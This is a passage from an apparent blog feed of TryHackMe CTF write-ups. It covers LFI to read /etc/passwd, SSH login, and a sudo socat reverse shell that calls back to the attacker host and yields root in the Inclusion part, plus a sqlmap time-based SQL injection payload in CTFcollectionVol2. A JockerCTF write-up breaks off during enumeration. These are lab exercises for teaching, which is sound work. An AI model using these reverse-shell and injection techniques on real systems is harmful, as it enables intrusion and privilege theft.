Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds
root@kali:~#&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We have two ports open 22 for SSH and 80 for HTTP running under python, which I think running django ... anyways! &lt;/p&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-16.00.48.png" class="kg-image" alt="Inclusion | CTF write-up"&gt;&lt;figcaption&gt;ow look at that LFI-attack!&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-15.40.22.png" class="kg-image" alt="Inclusion | CTF write-up"&gt;&lt;figcaption&gt;ok&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;and we have the /etc/passwd and a clear password for our user down there ...&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# ssh falconfeast@10.10.94.6
The authenticity of host '10.10.94.6 (10.10.94.6)' can't be established.
ECDSA key fingerprint is SHA256:VRi7CZbTMsqjwnWmH2UVPWrLVIZzG4BQ9J6X+tVsuEQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.94.6' (ECDSA) to the list of known hosts.
falconfeast@10.10.94.6's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Apr 10 20:13:54 IST 2020

  System load:  0.42              Processes:           87
  Usage of /:   34.9% of 9.78GB   Users logged in:     0
  Memory usage: 32%               IP address for eth0: 10.10.94.6
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

3 packages can be updated.
3 updates are security updates.


Last login: Thu Jan 23 18:41:39 2020 from 192.168.1.107
falconfeast@inclusion:~$ sudo -l
Matching Defaults entries for falconfeast on inclusion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falconfeast may run the following commands on inclusion:
    (root) NOPASSWD: /usr/bin/socat
falconfeast@inclusion:~$&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;we are user falconfeast ! and we have a NOPASSWD SUDO FOR SOCAT .... speaking of socat, there's a PoC in &lt;strong&gt;GTFObins&lt;/strong&gt;, I really recommend checking the website it does have a lot of good knowledge.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-15.46.56.png" class="kg-image" alt="Inclusion | CTF write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# socat file:`tty`,raw,echo=0 tcp-listen:5151
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;falconfeast@inclusion:~$ sudo -l
Matching Defaults entries for falconfeast on inclusion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falconfeast may run the following commands on inclusion:
    (root) NOPASSWD: /usr/bin/socat
falconfeast@inclusion:~$ RHOST=10.10.95.247
falconfeast@inclusion:~$ RPORT=5151
falconfeast@inclusion:~$ sudo /usr/bin/socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane

&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# socat file:`tty`,raw,echo=0 tcp-listen:5151
sh: 0: can't access tty; job control turned off                                     
# id                                                                                
uid=0(root) gid=0(root) groups=0(root)
# 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and that's it here, go get your flags! &lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/xjZtu4qi1biIo" width="480" height="360" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/thumbs-up-xjZtu4qi1biIo"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;Happy Hacking!&lt;/p&gt;</content:encoded></item><item><title>CTFcollectionVol2 | write-up</title><description>&lt;p&gt;Hello everyone, today's CTF is the second part of a first one, it doesn't mean you need to do the first one to pass to the second.&lt;br&gt;this CTF is rated as a medium when it comes to difficulty, but trust me it doesn't matter. less talking more doing ... let's&lt;/p&gt;</description><link>http://localhost:2368/ctfcollectionvol2-write-up/</link><guid isPermaLink="false">5e8f196e5e61514e230adc53</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Thu, 09 Apr 2020 13:28:55 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/holida-1.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/holida-1.png" alt="CTFcollectionVol2 | write-up"&gt;&lt;p&gt;Hello everyone, today's CTF is the second part of a first one, it doesn't mean you need to do the first one to pass to the second.&lt;br&gt;this CTF is rated as a medium when it comes to difficulty, but trust me it doesn't matter. less talking more doing ... let's start with some recon.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.194.62
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-09 12:45 UTC
Nmap scan report for ip-10-10-194-62.eu-west-1.compute.internal (10.10.194.62)
Host is up (0.00091s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 1b:c2:b6:2d:fb:32:cc:11:68:61:ab:31:5b:45:5c:f4 (DSA)
|   2048 8d:88:65:9d:31:ff:b4:62:f9:28:f2:7d:42:07:89:58 (RSA)
|_  256 40:2e:b0:ed:2a:5a:9d:83:6a:6e:59:31:db:09:4c:cb (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/VlNCcElFSWdTQ0JKSUVZZ1dTQm5JR1VnYVNCQ0lGUWdTU0JFSUVrZ1p5QldJR2tnUWlCNklFa2dSaUJuSUdjZ1RTQjVJRUlnVHlCSklFY2dkeUJuSUZjZ1V5QkJJSG9nU1NCRklHOGdaeUJpSUVNZ1FpQnJJRWtnUlNCWklHY2dUeUJUSUVJZ2NDQkpJRVlnYXlCbklGY2dReUJDSUU4Z1NTQkhJSGNnUFElM0QlM0Q=
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: 360 No Scope!
MAC Address: 02:9C:ED:08:6E:A4 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.16 seconds
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;we have two ports open, the first one is 22 serving us SSH, the second one is 80 for HTTP running Apache, and I noticed something weird in the results, something that looks like a base64, but let us move on and discover what it is.&lt;/p&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-13.51.58.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;figcaption&gt;&lt;strong&gt;Warning!!:The challenge contains seizure images and background. If you feeling uncomfortable, try removing the background on &amp;lt;style&amp;gt; tag&lt;/strong&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG01&lt;/blockquote&gt;&lt;p&gt;The machine is designed to be exploited via the web to obtain the flags. From this point of view we use gobuster to get the directories, as always, we check the file &lt;code&gt;robots.txt&lt;/code&gt;where we see a hexadecimal string.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# gobuster dir -u http://10.10.194.62/ -w /usr/share/dirb/wordlists/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.194.62/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/04/09 13:06:41 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/.hta (Status: 403)
/button (Status: 200)
/cat (Status: 200)
/cgi-bin/ (Status: 403)
/iphone (Status: 200)
/index (Status: 200)
/index.php (Status: 200)
/login (Status: 301)
/robots (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
/small (Status: 200)
/static (Status: 200)
/who (Status: 200)
===============================================================
2020/04/09 13:06:42 Finished
===============================================================
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-17.10.47.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-13.57.21.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;figcaption&gt;From Hex&lt;/figcaption&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG02&lt;/blockquote&gt;&lt;p&gt;We went back to the file robots.txt encore, where we see an encoded URL.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-17.28.49.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-14.01.32.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;Base64 &amp;gt; URL decode &amp;gt; Base64 &amp;gt; "Remove spaces" &amp;gt; Base64 &amp;gt; "Remove spaces" &amp;gt; Base64&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-14.01.46.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
	&amp;lt;head&amp;gt;
		&amp;lt;title&amp;gt; A slow clap for you&amp;lt;/title&amp;gt;
		&amp;lt;h1 style="text-align:center;"&amp;gt;A slow clap for you&amp;lt;/h1&amp;gt;
	&amp;lt;/head&amp;gt;
	
	&amp;lt;body&amp;gt;
	&amp;lt;p style="text-align:center;"&amp;gt;&amp;lt;img src="kim.png"/&amp;gt;&amp;lt;/p&amp;gt;
	&amp;lt;p style="text-align:center;"&amp;gt;Not bad, not bad.... papa give you a clap&amp;lt;/p&amp;gt;
	&amp;lt;p style="text-align:center;color:white;"&amp;gt;Easter 2: THM{f4ll3n_b453}&amp;lt;/p&amp;gt;
	&amp;lt;/body&amp;gt;

&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;FLAG03&lt;/blockquote&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-14.17.49.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE html PUBLIC"-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"
&amp;lt;html&amp;gt;

	&amp;lt;head&amp;gt;
		&amp;lt;meta content="text/html;charset=utf-8" http-equiv="Content-Type"&amp;gt;
		&amp;lt;meta content="utf-8" http-equiv="encoding"&amp;gt;
		&amp;lt;p hidden&amp;gt;Seriously! You think the php script inside the source code? Pfff.. take this easter 3: THM{y0u_c4n'7_533_m3}&amp;lt;/p&amp;gt; 
		&amp;lt;title&amp;gt;Can you find the egg?&amp;lt;/title&amp;gt;
		&amp;lt;h1&amp;gt;Just an ordinary login form!&amp;lt;/h1&amp;gt;
	&amp;lt;/head&amp;gt;
	
	&amp;lt;body&amp;gt;
		
		&amp;lt;p&amp;gt;You don't need to register yourself&amp;lt;/p&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;
		&amp;lt;form method='POST'&amp;gt;
			Username:&amp;lt;br&amp;gt;
			&amp;lt;input type="text" name="username" required&amp;gt;
			&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;
			Password:&amp;lt;br&amp;gt;
			&amp;lt;input type="text" name="password" required&amp;gt;
			&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;
			&amp;lt;button name="submit" value="submit"&amp;gt;Login&amp;lt;/button&amp;gt;
		&amp;lt;/form&amp;gt;

			&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the &lt;strong&gt;/login&lt;/strong&gt; source code, contains our flag.&lt;/p&gt;&lt;blockquote&gt;FLAG04&lt;/blockquote&gt;&lt;p&gt;In this flag we will intercept our data from the &lt;strong&gt;POST&lt;/strong&gt; method, saved it as a text file, I called it r.txt and then you take that data and use it with SQLmap to perform a SQL POST injection.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-14.24.11.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# sqlmap -r r.txt --dbs
        ___
       __H__                                                                        
 ___ ___[.]_____ ___ ___  {1.4#stable}                                              
|_ -| . [,]     | .'| . |                                                           
|___|_  [)]_|_|_|__,|  _|                                                           
      |_|V...       |_|   http://sqlmap.org                                         

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:29:42 /2020-04-09/

[13:29:42] [INFO] parsing HTTP request from 'r.txt'
[13:29:42] [INFO] resuming back-end DBMS 'mysql' 
[13:29:42] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 2159 FROM (SELECT(SLEEP(5)))vqEg) AND 'iFUy'='iFUy&amp;amp;password=admin&amp;amp;submit=submit
---
[13:29:42] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL &amp;gt;= 5.0.12
[13:29:42] [INFO] fetching database names
[13:29:42] [INFO] fetching number of databases
[13:29:42] [INFO] resumed: 4
[13:29:42] [INFO] resumed: information_schema
[13:29:42] [INFO] resumed: THM_f0und_m3
[13:29:42] [INFO] resumed: mysql
[13:29:42] [INFO] resumed: performance_schema
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] THM_f0und_m3

[13:29:42] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.194.62'                                                                           
[13:29:42] [WARNING] you haven't updated sqlmap for more than 99 days!!!

[*] ending @ 13:29:42 /2020-04-09/

root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-14.35.29.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;figcaption&gt;Our flag is in the column Easter, the table nothing_inside, and the database THM_f0und_m3&lt;/figcaption&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG05&lt;/blockquote&gt;&lt;p&gt;For flag number 5, we continue digging in the database for credentials, two usernames are available, and only one contain an &lt;strong&gt;md5&lt;/strong&gt; hash.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-14.46.03.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;p&gt;After decrypting the hash we try the credentials in the &lt;strong&gt;/login&lt;/strong&gt; page and we get the flag.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-14.47.08.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG06&lt;/blockquote&gt;&lt;p&gt;For flag number 6, there's a hint giving with the question telling us to check for the main page header. After checking the headers requests, we owned the flag.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;HTTP/1.1 200 OK
Date: Thu, 09 Apr 2020 13:57:02 GMT
Server: Apache/2.2.22 (Ubuntu)
X-Powered-By: PHP/5.3.10-1ubuntu3.26
Busted: Hey, you found me, take this Easter 6: THM{l37'5_p4r7y_h4rd}
Vary: Accept-Encoding
Connection: close
Content-Type: text/html
Content-Length: 94328&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;Flag07&lt;/blockquote&gt;&lt;p&gt;In this challenge we have to use the "Invited cookie" with burpsuite, we pass it a number that we have to guess or brute-force but obviously it's A one, and it's the right invite cookie and you'll get the sixth flag&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.03.09.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG08&lt;/blockquote&gt;&lt;p&gt;For flag number 8, The front page source code says that you have to be an iphone to access the content, all you have to do is to modify the User Agent for your request from the original one to an iphone one, and you get the flag.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.03.44.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG09&lt;/blockquote&gt;&lt;p&gt;When we visit the &lt;strong&gt;/ready&lt;/strong&gt; page and use burp to take control of each request, we check the source code of the page we get the flag number 09.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.06.50.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG10&lt;/blockquote&gt;&lt;p&gt;In Flag number 10, you will need to send a &lt;strong&gt;GET&lt;/strong&gt; request with a referrer as 'tryhackme.com' to get back the flag from the page.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.13.09.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG11&lt;/blockquote&gt;&lt;p&gt;In the options on the main page, we see four choices, but we see that "Deskel" prefers egg. We send egg instead of the salad we make DesKel happy and we get the Flag number 10.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.17.18.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG12&lt;/blockquote&gt;&lt;p&gt;don't worry there's always hints in the questions, no need to stress on reading, doing is much easier ... anyway, there's a javascript code in the page go check it, they'll be a function there containing our flag&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.18.28.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG13&lt;/blockquote&gt;&lt;p&gt;Flag number 13 is related to Flag 9, fallow the lead from 9 to 13, same dynamic, source code...&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-18.06.08.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG14&lt;/blockquote&gt;&lt;p&gt;For flag 14, it's straight forward, the main page source code contain the flag as a png encoded to base64, decode it, and get the flag from the picture.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.19.09-1.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.21.16.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG15&lt;/blockquote&gt;&lt;p&gt;For this Flag, we will play some guessing games, don't get emotional about it, but you are going to lose some brain cells.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.23.18.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.43.53.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Each alphabet is a special hash number, guess the alphabet of each number of the hint, You'll get the flag.&lt;/p&gt;&lt;blockquote&gt;FLAG16&lt;/blockquote&gt;&lt;p&gt;Flag number 16 is very very easy, all you have to do is to click the three buttons on the browser all three at once, and you'll get the flag number 16.&lt;/p&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-18.18.07.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;figcaption&gt;use BURP!&lt;/figcaption&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG17&lt;/blockquote&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.53.57.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;figcaption&gt;Binary baby!&lt;/figcaption&gt;&lt;/figure&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/VbEloWwOz3QqYBsqIZ" width="480" height="480" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/OTHERCOLORS-matrix-illusion-already-been-made-VbEloWwOz3QqYBsqIZ"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;Binary &amp;gt; Hex &amp;gt; Text&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;FLAG18&lt;/blockquote&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-18.22.24.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Just say yes for eggs and you'll be given the flag.&lt;/p&gt;&lt;blockquote&gt;FLAG19&lt;/blockquote&gt;&lt;p&gt;For this flag, when you check the source code of the page, you see that a png image is there but it's not displayed, go get the picture, You get the flag number 19.&lt;/p&gt;&lt;blockquote&gt;FLAG20&lt;/blockquote&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-18.25.07.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-18.25.29.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;p&gt;And that's it for today, thank for participating in this 20Flag marathon ...&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/URuzvsMZNVm2wRd9K3" width="480" height="360" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/memecandy-URuzvsMZNVm2wRd9K3"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;Happy Hacking!&lt;/p&gt;</content:encoded></item><item><title>JockerCTF | write-up</title><description>&lt;p&gt;Hello world, I hope you are all well and safe home from the pandemic, today's challenge is a CTF by Tryhackme it's rated medium, but still it needs focus and trying the right techniques, or you'll just dive in a rabbit hole.&lt;/p&gt;&lt;p&gt;Let's get started with some enumeration ...&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/jockerctf-write-up/</link><guid isPermaLink="false">5e8caabb75832c27370ae6e1</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Tue, 07 Apr 2020 16:31:26 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/joker.jpg" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/joker.jpg" alt="JockerCTF | write-up"&gt;&lt;p&gt;Hello world, I hope you are all well and safe home from the pandemic, today's challenge is a CTF by Tryhackme it's rated medium, but still it needs focus and trying the right techniques, or you'll just dive in a rabbit hole.&lt;/p&gt;&lt;p&gt;Let's get started with some enumeration ...&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sV -sC 10.10.215.43 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 16:30 UTC
Nmap scan report for ip-10-10-215-43.eu-west-1.compute.internal (10.10.215.43)
Host is up (0.0010s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA)
|   256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA)
|_  256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HA: Joker
8080/tcp open  http    Apache httpd 2.4.29
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Please enter the password.
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 401 Unauthorized
MAC Address: 02:9E:D8:EE:E7:2C (Unknown)
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.18 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-17.31.50.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-17.32.05.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;well well well, we have three ports &lt;strong&gt;ssh&lt;/strong&gt; on 22 and some &lt;strong&gt;apache&lt;/strong&gt; on 80 and 8080, It seems that we need credentials to access something in port 8080.&lt;/p&gt;&lt;p&gt;we'll dig more in port 80 and see if we have any interesting directories and files.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# dirb http://10.10.215.43/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Apr  7 16:37:56 2020
URL_BASE: http://10.10.215.43/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.215.43/ ----
==&amp;gt; DIRECTORY: http://10.10.215.43/css/                                            
==&amp;gt; DIRECTORY: http://10.10.215.43/img/                                            
+ http://10.10.215.43/index.html (CODE:200|SIZE:5954)                              
+ http://10.10.215.43/phpinfo.php (CODE:200|SIZE:94848)                            
+ http://10.10.215.43/server-status (CODE:403|SIZE:277)  &lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code class="language-markup"&gt;root@kali:~# dirb http://10.10.215.43/ -X .txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Apr  7 16:38:47 2020
URL_BASE: http://10.10.215.43/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: (.txt) | (.txt) [NUM = 1]

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.215.43/ ----
+ http://10.10.215.43/secret.txt (CODE:200|SIZE:320)                               
                                                                                   
-----------------
END_TIME: Tue Apr  7 16:38:49 2020
DOWNLOADED: 4612 - FOUND: 1
